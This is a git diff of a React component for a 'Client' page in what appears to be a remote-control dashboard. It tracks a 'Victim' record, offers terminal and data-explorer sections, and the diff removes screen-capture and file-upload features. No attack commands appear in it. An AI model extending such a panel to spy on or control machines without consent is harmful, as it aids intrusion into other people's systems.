@@ -2,12 +2,8 @@ import React, { useEffect, useState } from "react";
 import { useLocation } from "react-router-dom";
 import {
   FaAddressCard,
-  FaCamera,
   FaDatabase,
-  FaFolder,
   FaLaptop,
-  FaSearch,
-  FaUpload,
   FaUser,
   FaUserShield,
 } from "react-icons/fa";
@@ -16,15 +12,12 @@ import Terminal from "../../components/Terminal";
 import NotFound from "../404";
 import Header from "./sections/Header";
 import Details from "./sections/Details";
-import ScreenCapture from "./systemSections/ScreenCapture";
-import FileUploader from "./systemSections/fileUpload";
 import ClientOverview from "./sections/ClientOverview";
 import SecurityMonitoring from "./sections/SecurityMonitoring";
 import DataExplorer from "./sections/DataExplorer";
 
 const Client: React.FC = () => {
   const [tab, setTab] = useState("overview");
-  const [systemTab, setSystemTab] = useState(""); // ["screen-capture", "file-manager", "file-search"]
   const [client, setClient] = useState<Victim>();
   const location = useLocation();
 
@@ -44,7 +37,7 @@ const Client: React.FC = () => {
 
     fetchClient();
     console.log(client);
-  }, [location]);
+  }, [location.pathname]);
 
   const tabsAllowed = [
     {
